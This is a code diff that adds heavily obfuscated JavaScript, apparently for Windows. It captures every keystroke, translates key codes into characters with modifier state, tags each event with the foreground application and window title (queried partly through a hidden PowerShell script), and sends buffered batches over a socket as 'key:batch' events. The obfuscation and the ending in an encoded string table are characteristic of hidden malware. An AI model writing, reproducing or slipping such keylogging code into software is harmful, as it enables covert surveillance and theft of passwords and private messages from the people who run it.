+const e3=['$shell = New-Object -ComObject Shell.Application','$target = '+e2,e1.Fihgn,e1.qtpJO,e1.UiLOH,'\x20\x20\x20\x20$name\x20=\x20[string]$w.LocationName',e1.nwBNT,e1.jKKZq,e1.IhceZ,e1.NAqna,e1.UOGrO,e1.AElqY,'        Write-Output ([string]$doc.Folder.Self.Path);
+\x20break',e1.DMXYs,e1.HRNvV,e1.KxYBG,'}
+'].join(';
+\x20'),e4=e1.xByXp(o,e1.MMbXi,[e1.tbFFd,e1.TgOfC,e3],{
+'encoding':'utf8','timeout':0x5dc,'windowsHide':!![]}
+);
+if(e1.oxNbK(e4.status,0x0)&&e4.stdout)return e1.qiZRN(String,e4.stdout).trim();
+}
+catch(e5){
+}
+return'';
+}
+function Ue(e0,e1,e2){
+const DB=a0eX,DX=a0eX,e3={
+'KmLjZ':function(e6,e7){
+return e6(e7);
+}
+,'rifYr':function(e6,e7){
+return e6&&e7;
+}
+,'TeIvo':function(e6,e7){
+return e6(e7);
+}
+,'HJLQE':function(e6){
+return e6();
+}
+}
+,e4=e3.KmLjZ(Ge,e0);
+let e5=Re(e0);
+e3.rifYr(!e5,e4)&&(e5=e3.TeIvo(De,e4));
+if(!e5){
+const e6=e3.HJLQE($t);
+e6&&(e5=Re(e6),!e5&&(e5=e3.KmLjZ(De,e3.TeIvo(Ge,e6))));
+}
+return e5;
+}
+function Be(e0){
+const Dy=a0eX,Dz=a0eX,e1={
+'VaapO':function(e2,e3){
+return e2||e3;
+}
+,'fOpjN':function(e2,e3,e4,e5){
+return e2(e3,e4,e5);
+}
+,'hWrFH':function(e2,e3){
+return e2|e3;
+}
+,'mkxWY':function(e2,e3,e4,e5,e6){
+return e2(e3,e4,e5,e6);
+}
+,'USIkl':'utf16le','BSCEs':function(e2,e3){
+return e2(e3);
+}
+}
+;
+if(e1.VaapO(!e0,!Bt))return'';
+try{
+const e2=[0x0];
+Bt(e0,e2);
+const e3=e2[0x0];
+if(!e3)return'';
+let e4=Zt(B,![],e3);
+!e4&&(e4=e1.fOpjN(Zt,e1.hWrFH(V,F),![],e3));
+if(!e4)return'';
+try{
+const e5=Buffer.alloc(0x200*0x2),e6=[0x200];
+if(e1.mkxWY(ee,e4,0x0,e5,e6)){
+const e7=e5.toString(e1.USIkl).replace(/\0+$/,'');
+return n.parse(e7).name;
+}
+}
+finally{
+e1.BSCEs(te,e4);
+}
+}
+catch(e8){
+return'';
+}
+return'';
+}
+function Ve(e0){
+const Db=a0eX,Dj=a0eX;
+if(!e0)return'';
+const e1=e0.toLowerCase();
+if(Q[e1])return Q[e1];
+if(e0===e0.toLowerCase())return e0.charAt(0x0).toUpperCase()+e0.slice(0x1);
+return e0;
+}
+function Fe(){
+const DQ=a0ey,Du=a0ey,e0={
+'GqRzY':function(e1){
+return e1();
+}
+,'PYEcf':function(e1,e2,e3){
+return e1(e2,e3);
+}
+,'hCHom':function(e1,e2){
+return e1!==e2;
+}
+,'HgBQG':function(e1,e2){
+return e1(e2);
+}
+,'JhiEe':function(e1){
+return e1();
+}
+}
+;
+if(!vt||!$t)return null;
+try{
+const e1=e0.GqRzY($t);
+if(!e1)return null;
+const e2=qt(),e3=[0x0],e4=e0.PYEcf(Bt,e1,e3);
+let e5=![];
+e0.hCHom(e2,e4)&&(e5=Vt(e2,e4,!![]));
+try{
+const e6=e0.GqRzY(xt);
+if(e6&&e0.HgBQG(Ut,e6))return e6;
+const e7={
+'cbSize':s.sizeof(Tt),'flags':0x0,'hwndActive':null,'hwndFocus':null,'hwndCapture':null,'hwndMenuOwner':null,'hwndMoveSize':null,'hwndCaret':null,'rcCaret':{
+'left':0x0,'top':0x0,'right':0x0,'bottom':0x0}
+}
+;
+if(e0.PYEcf(Ft,e4,e7)){
+if(e7.hwndFocus&&Ut(e7.hwndFocus))return e7.hwndFocus;
+if(e7.hwndActive&&Ut(e7.hwndActive))return e7.hwndActive;
+}
+}
+finally{
+e5&&Vt(e2,e4,![]);
+}
+return e1;
+}
+catch(e8){
+try{
+return e0.JhiEe($t);
+}
+catch(e9){
+return null;
+}
+}
+}
+let qe={
+'appName':'','windowTitle':'','ts':0x0}
+;
+const je=0x2ee;
+function Ye(){
+const DZ=a0eX,DE=a0eX,e0={
+'sMFvO':function(e1,e2){
+return e1(e2);
+}
+,'cgtMF':function(e1,e2){
+return e1(e2);
+}
+,'TdGPO':function(e1,e2,e3,e4){
+return e1(e2,e3,e4);
+}
+}
+;
+if(!vt)return{
+'appName':'','windowTitle':''}
+;
+try{
+const e1=$t?$t():null;
+if(!e1)return{
+'appName':'','windowTitle':''}
+;
+const e2=e0.sMFvO(Be,e1),e3=e0.cgtMF(Ve,e2),e4=e0.TdGPO(Ue,e1,e3,e2);
+return{
+'appName':e3,'windowTitle':e4}
+;
+}
+catch(e5){
+return{
+'appName':'','windowTitle':''}
+;
+}
+}
+function ze(){
+const DW=a0eX,Dv=a0eX,e0=Date.now();
+if(e0-qe.ts<je)return qe;
+const e1=Ye();
+return qe={
+'appName':e1.appName||'','windowTitle':e1.windowTitle||'','ts':e0}
+,qe;
+}
+function Qe(e0,e1){
+const Dl=a0eX,Do=a0eX,e2={
+'ulKlT':function(e5){
+return e5();
+}
+}
+;
+e1=e1||e2.ulKlT(ze);
+const e3=(e1.appName||'').trim(),e4=(e1.windowTitle||'').trim();
+if(e3)e0.appName=e3;
+if(e4)e0.windowTitle=e4;
+return e0;
+}
+function Je(e0){
+const Dh=a0eX,Df=a0eX,e1={
+'aRFuj':function(e2,e3){
+return e2===e3;
+}
+,'iMyug':function(e2,e3){
+return e2===e3;
+}
+,'oKvAw':function(e2,e3){
+return e2===e3;
+}
+,'xHyGY':function(e2,e3){
+return e2===e3;
+}
+,'NLwBA':function(e2,e3){
+return e2===e3;
+}
+,'pLYCO':function(e2,e3){
+return e2===e3;
+}
+}
+;
+return e1.aRFuj(e0,C)||e1.iMyug(e0,W)||e1.aRFuj(e0,P)||e1.iMyug(e0,y)||e1.iMyug(e0,I)||e1.oKvAw(e0,S)||e1.iMyug(e0,b)||e1.xHyGY(e0,M)||e0===T||e1.NLwBA(e0,E)||e1.pLYCO(e0,K)||e1.xHyGY(e0,O);
+}
+function Xe(e0){
+const Da=a0ey,DI=a0ey,e1=Buffer.alloc(0x100),e2=e0||ht;
+return e2.shift&&(e1[b]=0x80,e1[M]=0x80),e2.ctrl&&(e1[y]=0x80,e1[I]=0x80),e2.alt&&(e1[C]=0x80,e1[W]=0x80),e2.meta&&(e1[E]=0x80),e2.caps&&(e1[O]=0x1),e1;
+}
+function Ze(e0,e1,e2){
+const DL=a0ey,DU=a0ey,e3={
+'iwHqv':function(e5,e6){
+return e5&&e6;
+}
+,'doHcB':function(e5,e6){
+return e5(e6);
+}
+,'cYeWG':function(e5,e6){
+return e5!=e6;
+}
+,'eHAwA':function(e5,e6){
+return e5!==e6;
+}
+,'nmfwn':function(e5,e6,e7){
+return e5(e6,e7);
+}
+,'aTLUk':function(e5,e6){
+return e5<e6;
+}
+,'KTATe':function(e5,e6,e7,e8,e9,eD,eP){
+return e5(e6,e7,e8,e9,eD,eP);
+}
+,'DYqIK':function(e5,e6){
+return e5>e6;
+}
+,'yUwMI':'utf16le','SLWEc':function(e5,e6){
+return e5*e6;
+}
+,'eZRXS':function(e5,e6,e7,e8){
+return e5(e6,e7,e8);
+}
+}
+,e4=e2||ht;
+if(e3.iwHqv(ue,ae))try{
+const e5=e3.doHcB(Xe,e4),e6=e3.cYeWG(e1,null)&&e3.eHAwA(e1,0x0)?e1:e3.nmfwn(ae,e0,0x0),e7=Buffer.alloc(0x10);
+let e8=ue(e0,e6,e5,e7,0x8,0x0);
+e3.aTLUk(e8,0x0)&&(e3.KTATe(ue,e0,e6,e5,e7,0x8,0x0),e8=0x0);
+if(e3.DYqIK(e8,0x0)){
+const e9=e7.toString(e3.yUwMI,0x0,e3.SLWEc(e8,0x2));
+if(e9&&!/^[\u0000-\u001f]$/.test(e9))return e9;
+}
+}
+catch(eD){
+}
+return e3.eZRXS(tn,e0,e4.shift,e4.caps);
+}
+function tn(e0,e1,e2){
+const DK=a0eX,Dp=a0eX,e3={
+'gsbaQ':function(e5,e6){
+return e5==e6;
+}
+,'MSeqE':function(e5){
+return e5();
+}
+,'jPuko':function(e5,e6){
+return e5>=e6;
+}
+,'zrvBa':function(e5,e6){
+return e5<=e6;
+}
+,'ZMorO':function(e5,e6){
+return e5(e6);
+}
+,'NpSwV':function(e5,e6){
+return e5-e6;
+}
+,'eybEU':function(e5,e6){
+return e5!=e6;
+}
+,'YjFlV':function(e5,e6){
+return e5>=e6;
+}
+,'jyagJ':function(e5,e6){
+return e5>=e6;
+}
+,'KbZGA':')!@#$%^&*(','KhMBn':function(e5,e6){
+return e5-e6;
+}
+,'jnbxO':function(e5,e6){
+return e5===e6;
+}
+}
+;
+if(e3.gsbaQ(e2,null))e2=e3.MSeqE($e);
+if(e3.jPuko(e0,A)&&e3.zrvBa(e0,L))return e3.ZMorO(String,e3.NpSwV(e0,A));
+if(e3.eybEU(z[e0],null))return z[e0];
+if(e3.YjFlV(e0,0x41)&&e3.zrvBa(e0,0x5a)){
+const e5=String.fromCharCode(e0);
+return xe(e1,e2)?e5:e5.toLowerCase();
+}
+if(e3.jyagJ(e0,0x30)&&e0<=0x39){
+if(e1)return e3.KbZGA[e3.KhMBn(e0,0x30)];
+return String.fromCharCode(e0);
+}
+if(e0===0x20)return'\x20';
+if(e3.jnbxO(e0,0x9))return'\x09';
+if(e0===0xd||e3.jnbxO(e0,0xa))return'\x0a';
+const e4={
+0xc0:['`','~'],0xbd:['-','_'],0xbb:['=',],0xdb:['[','{
+'],0xdd:[']','}
+'],0xdc:['\x5c','|'],0xba:[';
+',':'],0xde:['\x27','\x22'],0xbc:[',','<'],0xbe:['.','>'],0xbf:['/','?']}
+;
+if(e4[e0])return e4[e0][e1?0x1:0x0];
+return null;
+}
+function en(e0,e1){
+const DT=a0eX,DO=a0eX,e2={
+'TFMDV':function(e3,e4){
+return e3===e4;
+}
+,'iTjav':function(e3,e4){
+return e3===e4;
+}
+,'PBYEa':function(e3,e4){
+return e3===e4;
+}
+,'lSXLo':function(e3){
+return e3();
+}
+}
+;
+if(e2.TFMDV(e0,C)||e0===W||e2.TFMDV(e0,P))ht.alt=e1;
+else{
+if(e2.TFMDV(e0,y)||e2.TFMDV(e0,I)||e2.TFMDV(e0,S))ht.ctrl=e1;
+else{
+if(e2.TFMDV(e0,b)||e2.TFMDV(e0,M)||e2.TFMDV(e0,T))ht.shift=e1;
+else{
+if(e2.iTjav(e0,E)||e2.PBYEa(e0,K))ht.meta=e1;
+else e0===O&&(ht.caps=e2.lSXLo($e));
+}
+}
+}
+}
+function nn(e0,e1,e2,e3){
+const DM=a0ey,Dg=a0ey,e4={
+'Nkdzn':function(e9,eD){
+return e9(eD);
+}
+,'DKGOV':function(e9,eD,eP,ed){
+return e9(eD,eP,ed);
+}
+,'nwqDi':'keydown','ZZktI':'keyup','zcGab':function(e9,eD){
+return e9(eD);
+}
+,'zBNKZ':function(e9,eD){
+return e9(eD);
+}
+}
+,e5=e3||ht,e6=e4.Nkdzn(Boolean,e5.caps),e7=e1?e4.DKGOV(Ze,e0,e2,e5):null,e8={
+'type':e1?e4.nwqDi:e4.ZZktI,'keyCode':e0,'keychar':e7,'key':'vk_'+e0,'altKey':e4.zcGab(Boolean,e5.alt),'ctrlKey':e4.Nkdzn(Boolean,e5.ctrl),'shiftKey':e4.zcGab(Boolean,e5.shift),'metaKey':e4.zcGab(Boolean,e5.meta),'capsLock':e6,'ts':ge()}
+;
+if(e1)e4.zBNKZ(Qe,e8);
+return e8;
+}
+function on(e0){
+const Dk=a0eX,DJ=a0eX,e1={
+'aKmII':function(e4,e5){
+return e4/e5;
+}
+,'FmvrF':function(e4,e5){
+return e4===e5;
+}
+,'VRGFE':function(e4,e5){
+return e4<e5;
+}
+,'FZitF':function(e4,e5){
+return e4-e5;
+}
+}
+,e2=[e0.type,e0.keyCode,e0.keychar,e0.ctrlKey,e0.shiftKey,e0.altKey,e0.metaKey].join('|'),e3=e1.aKmII(Date.now(),0x3e8);
+if(mt&&e1.FmvrF(mt.signature,e2)&&e1.VRGFE(e1.FZitF(e3,mt.ts),0.08))return!![];
+return mt={
+'signature':e2,'ts':e3}
+,![];
+}
+function rn(e0){
+const DF=a0eX,Dr=a0eX,e1={
+'lifvG':function(e2,e3){
+return e2!==e3;
+}
+,'kbGVq':function(e2,e3){
+return e2>=e3;
+}
+,'FJZUE':function(e2,e3){
+return e2+e3;
+}
+,'RSqre':function(e2,e3){
+return e2-e3;
+}
+}
+;
+if(!e0||e1.lifvG(e0.type,'keydown'))return;
+e1.kbGVq(gt.length,a)&&gt.splice(0x0,e1.FJZUE(e1.RSqre(gt.length,a),0x1)),gt.push(e0);
+}
+function ln(){
+const Dq=a0ey,Ds=a0ey,e0={
+'QtHam':function(e2,e3){
+return e2>e3;
+}
+,'UpqJZ':function(e2,e3){
+return e2-e3;
+}
+,'lXXco':'key:batch','iKhVY':function(e2,e3){
+return e2>e3;
+}
+,'RaIsX':function(e2,e3){
+return e2-e3;
+}
+}
+;
+if(!gt.length)return 0x0;
+const e1=gt.splice(0x0,gt.length);
+if(!Jn||!Jn.connected)return gt.unshift(...e1),e0.QtHam(gt.length,a)&&gt.splice(0x0,e0.UpqJZ(gt.length,a)),0x0;
+try{
+return Jn.emit(e0.lXXco,{
+'events':e1,...ke()}
+),e1.length;
+}
+catch(e2){
+return gt.unshift(...e1),e0.iKhVY(gt.length,a)&&gt.splice(0x0,e0.RaIsX(gt.length,a)),console.log('Error flushing\x20key buffer:\x20'+e2.message),0x0;
+}
+}
+function a0e0(){
+const dO=['C3rVCMuO','uejzrwe','Dhj1zq','rNbAuK0','AYa9pt0G','A0v4vYHx','ChjVy2vZ','A2vUifrp','ls1UBY1H','svPOsei','rMLSzsbf','zv9JB3b5','yMXL','sunHz2i','DcbUzxH0','sf9lrvLc','D2LSBcbI','B1bcCeS','ieHpt0TF','BgXLzc4G','rxHLtMfT','Dcbxtv9l','s19mv0Lo','icSGmL0G','DeXvuvu','tuvuqsa9','oI8V','DxjPBMCN','ExHsCfy','lcb2B2LK','EwjVyxjK','icbWyxjL','Aw5NigrV','zcGPjYK7','q3rqwfu','mcK7cG','cN0ky29U','j3zVAwqG','icaTAsWG','x0XtseLg','Exn0zw0G','y3rPDMvd','kgnVBNn0','twLJCM9Z','s2PSDuK','qvbqr04','v0LoihX8','DMvSigTL','ruPxvuu','ywDLBNrF','sMHPrwu','A29MzMKU','BNqTAwq','BxzhuNO','zY4GuhjL','zvLKAxu','Dcbit09l','ieHLyxj0','zgnHBgWG','DgLVBIbY','q2XPCgjV','zw50ug9Y','BYbIzsbL','BNn0ignH','CvreCvq','DxrFie1t','C2vYmZiU','zMLSzq','s0fQzem','uLDjtIa9','ifnOyxjL','ywr5jYWG','wwvZ','icaGih0','BIbPBMzV','C2fI','cIaGCgfY','ktSkFqOk','ywLSzwq','ChbLza','CNiUBwvZ','ktSkicbW','svHvtNO','pt09ifzl','CIbSugfY','igTLEsbL','nhWXmNWZ','icPSCgr3','AMvJDcCP','BM90igLU','q0vYEwG','ksCPoWPJ','D2LUmZiT','igLZihDO','psaWEde0','rf9dqvbt','oWP9cGPJ','oIaNAw50','uLjjtgG','CgD1AsK','CMqGAg9V','B2r1Bgvo','B2zMAs5W','CYGP','rZOGqwDL','B21Tyw5K','z3mP','DxrWDxqG','C0fSDca9','rhnABvO','B2z0ievK','ihq6icDL','DgLUzYbR','cIaGj2LU','CMLMwxi','CM9JzxnZ','Awz0id0G','rxGGzMfP','ywXSieDL','te1ftLuG','zguGFcaW','lKfWCgXP','EMvnDe4','tLuGpsaW','yxqGzML4','rMLOz24','BKLKkcK','zu1brum','C29JA2v0','Aw5KB3DZ','EhrYyuLU','veHsrufe','Dgf0zsWG','Fcb2AYa9','t0WGFhWG','A1bYB2mO','igXVywrL','tgfIzwW6','x2LK','ifzlx1ni','BgWGug9Z','vvzAv1i','x3vYBa','zwqG','cIaGicbJ','ihzRid09','C2nHBKnV','lcb7cIaG','q1rstdSk','zwHcAge','B2rZkcKG','igLUDhb0','tgzeEgy','Cgf0Aa','B2fYzcbY','jYWGEtOG','mZz8mhWX','BgyGlwfU','t0WGpsaW','DY5eB2n1','BgvxkgnV','zg93C0HV','AYbHBhnV','BIWGDM9P','CMfTksCk','tLuGFhWG','B3HoyKS','DMSSigLZ','zsb1BMf2','ihn1y2nL','DMTdB2rL','BKnVzguS','Dgf0zsHw','yYGNDM9P','zgvJB2rL','lNnHyJSk','B3jRzxje','q0fqid0G','DcbeAxnW','cLnODxr0','A29MzMKG','ifnOzwXS','C3rVCIH2','zfrOCMvH','Bgviyw5K','zsaRidfD','Aw50mZi','lsbRzwvW','Cxf4rKO','B2LKicPS','C3nPB24U','qLDREuW','wvPhvwu','oWOGigLM','BYbZzxj2','swqP','tcWGy2fS','iezSDxnO','DgfYDgvK','CgLK','CMqGB24G','CgvUuhjV','tuvovsb8','CYaODMLH','mtaZnfz2tKz6sW','y2fSBcbq','ohW5Fdi4','yxjKigXH','z3rOvYH2','ug9YDc5W','kMXWzhDt','yxj0igzY','lcaWlcaW','A2vYBMvS','BgDUCLC','z1jTBfC','Ag9VA0HH','icHKzwzH','vKTFtfDj','D2LUmZi','ntmWnfzkCuPurW','igj1DcbJ','AuTOvLK','y3DSAM4','r1vjvgHY','ienSAxbI','zvrQwMi','khzVAwqG','qwXStgLZ','ChqG','ksbPCYbY','q3rYBcKG','vgrhue8','yxGP','Aw50ig5w','y2fSBcbv','yxb0DxjL','CMvHzeLK','icDLCNiN','nxWYFdn8','ieXVD0XL','zefSq1m','yIWGvKTF','v2LUmZiG','tM1qu0O','CM9Jid0G','Bcbhzxrn','yM9HCMrq','CMv0DxjU','AwyGkg1V','ihX8ihiG','zcWGDwLU','igHHBMrS','AwfByMfZ','t1DooWOG','DdmYigLK','B2TfEca9','DcaTq29T','DxqODwLU','AYWGA2iU','zw50x3DP','yYGkicaN','DhjPBMCO','wePgz08','zcH2AYKG','DhvYztPZ','EgL0jYb9','zxrxAw5K','Bg9VCcK','zZOGA29M','zxjY','AhjLywqS','AxncDwzM','qwDLBNqG','DMLLDW','B2fYzcbO','Bw9KC01L','zxiOD1bH','B25ZDcbn','nIbFx3n0','DhvYzsbZ','rxHJzwW','s0jeteXi','jIaXksa/','kaOGicDP','C2vUzgLU','q3rYBcTd','icbWCM9J','AwyGkcfZ','mJz8mtv8','sgHovK4','s3HzqKC','A2v5yM9H','vfnhzxrb','vdSkia','tIKGBw9K','wwPgBfy','igLZigvT','wNHoqwm','FhWGDMSG','Dw5KzwzP','ywiPoWOk','Bg9Hza','ru5vid0G','v25Kkq','Dw5ZAgLM','BNn0ie1t','ALjXrxG','zMfPBgvK','t0fsrf9m','lunVBw1H','zgvYlLnL','psbYzxf1','zhDezxnP','Aw5ZDgfS','yxj0icaG','rdOG','Bgvoyw1L','BvD6zgu','ifbpsu5u','xYb1Aw50','y2fSBcbn','C2u7cGPM','Ag9TzwrP','igfMDgvY','qxvbq2m','igXVB3a6','lcbWywnR','B20GC2vY','Dw5Yzwy','zxnZywDL','yYGNyM9V','DML1yM0','zg9JlKzV','r2P4tgO','DMvSs2v5','A2v5Dxa','psb7igH3','Cg9SBgLU','BcbuB1vU','C01VzcH2','q29KztOG','sg5IyNK','qwTYBMq','DxnLCKLU','vKHvr2K','wNLPy2y','vvDNyKS','DwX0oIa','ChLFB3bL','mICSihnJ','CMfTlcbS','yxrHih0G','C2viyw5K','mcWGBfbH','B3nFDMvY','icbbz2vU','icb1CgrH','lcbUDwXS','DgvK','zMKUC3rY','wfrND3u','zgXLx2nV','AgrVzZOG','AxrZoWP9','ywqOj2TL','EvHxvKK','icD1Aw50','BMrVD3mG','CwLAuK4','x1jnru5v','yxm6','yM9HCMqO','CgTN','shjYvu4','zcbJyxb0','tIb8Fcb2','C2LNBMf0','tLbJBLC','BgWGvhjH','AwHMwgO','vca9ideS','ywXSyMfJ','lcb0Aw1L','rgLZy29U','CIb0AguG','idb4nwmS','wNLhtwi','EMT1zeu','v29Yza','zwqP','ztOGj1nL','ief0DgvT','id0Gr2v0','ihT9cIaG','z2uGFsK7','reXhzxi','tNbtD1y','FcbUDwXS','B2mUrM9S','q3PqBhy','D2fYBG','mZaWmJC0oeLQALrADW','ywDLBNrj','B3n0twvZ','vunu','DhLWzw9M','igjHC2uG','CLjOqvK','vKTFuLDj','zvPswfm','mtaWoWPJ','C0DkB1q','BgrLCI5u','igr3uhjV','z3HTAge','ksbICMvH','rM12CKy','BNnSyxrL','sg9VAYbM','BgfIzwW','C2HPzNq','C3qGvw5O','B3j0lcb3','ifrYyw5Z','icb0CNKG','zNvUyW','B2XKzxiU','icaGih0G','icaGy29U','DgvUzxjZ','ktSGDxnP','zwfKswqO','qNvMzMvY','mtaSifzl','CYaXma','n3WYm3WX','cLn0B3bW','AuD0ywC','Cg93zxjZ','B3aGC3rH','AM1uCfC','twvZC2fN','C2HPzNrl','q29UC29S','B25ZB2XL','u2HLBgWG','icb8Fcb2','kMHxBMqS','q1frCue','D21lrgq','tw1lzLe','Dcbnu0CG','suqGicaG','DgHYzwfK','mIa9igTV','Aw50ignJ','tMv4DeHV','t1nPwhu','tu9ex01f','ztPZDg9W','lZe5ns42','B2rZq3rY','Aev6weC','oWPJB25Z','ls1Zzxj2','rMLYzwzV','rcaOq0Xj','AfDYrKG','CYbVzIb1','zwLsCuC','cIaGicaG','BgjHy2S','zZOGv2LU','CMvNAxn0','DeTLEsK','BeTLEwjV','EYbJB250','vgDpzKm','y2fWDhvY','lM1LC3nH','zxjPBMCG','id0GtMv3','wK1Hq0e','B3bWAw5N','Axrjs1G','id0GmhG1','r29Vz2XL','CYa9ida7','qw1LuK0','wurkrKy','Dg9WignV','yxnZAwDU','yw1Z','B25Jzq','C3rVCMu','r3fjyNG','BsWGs0je','t0TFu0Xp','DcbIAxrZ','DgL2zq','oIbWCM9J','Aw5NoIbd','oIbqt0Lo','ihDPBJmY','yxjKoNjL','rLPUswG','DcblqG','ic8GzhjV','zsbPzIaO','ktSky29U','ihDqyxjH','ktSGFsbJ','A2v0ig5V','B3D2Cvu','zsWGD1bH','zffwyxm','sKn3ueC','psbit09l','BwT4v1K','ksbIAxrZ','icb9ignH','rhLMAhK','Ew1Sv3m','ywnOkq','icaGicaG','CMX5qMW','BNn0ihDY','CMvZCYa/','qNrnquK','svHUwuK','ugfYyw06','zxi6ia','u0HjrLqG','sfjXrLq','zM86icD1','rLPOD04','veznrfy','BsWGBfbH','revcvuC6','DxrMmtzS','B29Rv2LU','zxrlzxLt','B3jRzxiG','B2zMAsbT','AePLDuG','qxjJqKC','s2Lmz0W','BMrSzsWG','zZOGu29J','B29Sigjj','DcbSB2fK','DcbSywjL','y2uGDxnL','sgfUzgXL','Aw5JBhvK','cMnVBNn0','Ahr0CdOV','icHJB2rL','CYaXmq','C3mSihvP','v2fYBMLU','AxnqCMvZ','yYHPBNqG','uxriyw0','oNjLCxvL','lNzRq29K','yxrJAcaO','DdmYjYWG','zxrfCNjV','AM9PBG','nhbZu1vdDq','ugfYyw0S','EKjos1O','B3DZkq','BNqZmIbK','BgLMDKC','wNritLe','Bg9IywXm','Dhj1ztSk','EvHmBMK','ls1JBgLL','EYb0oIaN','nhWY','yvrmvwS','DgLVBIbJ','sg9VA0v4','re1ywxm','y2fWCW','DgnO','BufmEeO','y2f0y2G','sfjoDLy','BML0B3jP','zcaQBfbH','x29WzxjH','zYbqB3DL','twLUlcb1','zcGNDxnL','u1n6uuW','cIaGChjV','mIWGtu9e','CYa9icHh','ie1prf9d','Dg9mB3DL','BfHyy28','icDIB29S','ihjLywqP','DhvYBIb2','icHxAw5K','zw1PDa','mZiGkNbt','sgvVvwe','BgWGuhjV','EWOGihjL','ignSAxbI','CYa9ihDW','lu5VuhjV','C2CGFhWG','ANLHz0O','AxDiCxy','t09lx0nb','zcbTB25P','DdmYigr3','ywXSienH','mJj8nxWZ','tuHPAgK','z0zPBhrL','C01gDK8','CNjVCJOG','BM9Fyxv0','zLrZqw4','y0rmuwK','ufHqC0W','v3f1zwK','mZiGD01Z','DgjgrMq','ywDLBNq6','ztPZDgfY','BNDctLq','EwnADNO','twfJ','z10KDY5m','icb9cIaG','BYWGyM9V','zw50vgHY','t3v0Bg9V','BMrSzsb8','yxvSDdOG','wePQreO','zYbJBgLW','C3qGtg93','zwWGtefc','yxrJAe1L','C0LTywDL','tLrst0WG','v2LUmta','B25ZDcbh','Au15DwC','ywXSzwq','yZyXlty4','4PQGifDHCM4','BgWGuxvL','DMSGpt09','mZiUzgXS','s052rgG','Cvr1y0W','y2fSBcbh','EMnhywi','icbxCML0','CI5tzwXM','igLMicHP','zxnZAw9U','icaGFsbJ','Be5LEhri','Bg9N','w3n0CMLU','B2nRkhzV','quvSCvK','kgLHlcaW','y3rPDMuG','rNDMyw4','qxr0ywnO','psbnt0rF','C3rKy2fS','v0DyBxK','AfDUzcWG','ALb1A28','AxbIB2fY','Dca9ia','DcbTC2CG','mcWGBw9K','CgfYC2u','B2rLlcb1','DhvYzsbH','yxr0zw1W','ihvPBNqX','rufesu5g','msWGvKTF','v0TxyM4','lLbHDgGP','twfWvhLW','4PYtienHChq','CJmYlMrS','id0GC2nH','BgWGsxnd','Dw5JDgLV','Cg9PBNrL','jhrHCMDL','pt09ideP','D3H6tKi','AwyGkcr0','A1bYB2mS','zxjYksb7','v25KlcbF','zMzPlNn0','EdeXlcbw','qxziAha','y3rtq1G','B19ZDgfY','yxj0ignS','vYHFt3v0','zxqGBw9K','rK1TENa','BMn0Aw9U','icbYAw5N','yxjKig1V','lKzVBgrL','BNnL','AxnWyxrJ','B2fYzcbT','ifn0DwrP','C3qGD3aG','yxrL','icPOAgSS','tfnisuzu','zefYCMf5','sgDcuuC','rMLSzvn5','tcaGicaG','ANnFy2XP','te5Kthm','lMLVlwnS','nJm2m1zXzgvXDq','AwqGy29U','ugfYyw0P','BhbnB2r1','D05szxi','CNjLBNru','zNvUyYGk','zwqGy2fW','Dg9tDhjP','ywWGBgfN','s2Ljugm','C3rYDwn0','mZiGzhDq','4PYtienSAxa','zxiGvvjm','kcD1Aw50','Cg9ZDe1L','s0voicaG','turUr3e','EeH5r1K','zwvWAw5N','zw50','tgLUDxG','BgWGt3bL','yvjgDwO','mJSky29U','yuTTsuK','AhjLywrj','A1L6DLO','oxW0mNWZ','AefkDei','Evv3tuK','lNqGpt09','BMHVB2Tx','ihzVAwqG','ze1LC3nH','tca9ideZ','swruv3q','B3jRzxjF','tvnhid0G','AwXSig5V','tLjPyxO','C3rHDhvZ','AgvUDgLJ','ig5LEhq7','rKvozeG','BIaOsLmP','DcGXktSk','vwLmt0G','txrIswm','CK1HEcWG','AgfYCY4k','A1jLzIK7','yxjKoMnV','mti1nJuXmgXQywXsyq','B2rLlcbJ','B2SGD29Y','DgnOihT9','EMLusxK','CNLgDwXS','lI4UjYKG','nhWXFdb8','swHJzvO','C2CUDca9','z2jqBNi','y2HHCJe2','CMf0Aw9U','EcH2B2LK','zs1pDxrW','qxrVBwLJ','wvzPuLi','CJmYig5V','ywnOvgHY','idePid8G','igfJDgL2','m3WXFdv8','CMvTB3zL','wvnlrvLe','rvLet1Do','DxjLlI4U','DgrJywXS','BgWGr2v0','CMvZCg9U','BgXozxH0','tgvUu0q','Aw5KB3Du','Bca9ihy7','ywXPDMu','CIb3ugfY','vgvjDM8','DfDPBMrV','Ae1LC3nH','vvnjA2W','BI10AhjL','BsWGAw50','icyMief0','BKHbCeS','Bgf0zu1L','yK9wy2m','BNDXrgK','zxLIrvu','CM9JuhrY','icH3CML0','icHBAw50','ywDLkhSG','nJrDjhCU','r3fsELK','y29UC3qG','vKTFuK1f','id0GmcWG','yw5KBgvx','EfL0A2S','igzSDxnO','DhjPBMC','ywqGzMfS','kMXWtxnN','oNjLC3bV','id0GmhHH','sMLiu3a','BMvJDa','uhjLC3mP','Aw5NuhvZ','D0LrBvC','zxnZswqO','kgvTChr5','y2fSBcbx','igLHw2jH','tvnh','BgWGvw5O','jYWGzhDf','AfzRuMC','kcDPBNqX','x091Df8G','vMfHCe8','zxHWB3j0','CMq6icC','q0nLEMK','zvCOBxnN','ysWGmIKG','C2L6zw9M','y2GGkf8P','vKTFq0fq','zwXZzsbP','y3vZ','tKX3qKe','yYaQBhbM','khSGDdOG','AxrLid0G','rMfPBgvK','Df9LCNjV','B2zM','t0rjAey','zujkA2m','EWOGihzR','swq6ihrO','C2fNzsa6','t3fOChO','ru5ux0Le','nJK5odbvrxPrBK8','ihjLDhvY','AZSkicaG','AwXLzdOG','sM1gv3a','zLLevgy','DM9PzcaQ','B3i6ia','CNrLza','u0CGkMXW','Fdi0FdeZ','DhLWzq','D2LUzg93','C1f2z20','zxHPDgvK','AMvJDcK','BgWGrgLZ','DxqGjhrP','A2v5q29K','C3bSAwnL','CMvZDgfY','vKTFq09o','BgWGsxnx','rgnevM4','vLnnDeK','AgLSzsaO','BM1MD24','yw5KigzY','ywXSB2m','Bw1HBMq','ALvQD0m','ie1prf9t','yxzHAwXH','u0Lhvevs','DfrOCMvH','BgvUz3rO','CgfYzw50','v25KtMv3','zNvUy3rP','vKTFte1f','n3WZohWY','D0XOu00','x1jtseLg','nZrOwK1pr3K','vee7cIaG','FtSkicb3','Dc5WB3n0','zwfKsw5M','Be1OCNa','DwLUDde2','CJmYlMz1','C3bVBNnL','ksfaiYqL','oty3mJnZr2XKB1C','AKzewNO','ChbLzcbJ','jYaOBgvU','Dwn0kcDq','qLfuCu4','yxbWtMfT','qu9zAvG','zK9WAK4','yML0CYb8','AYb1B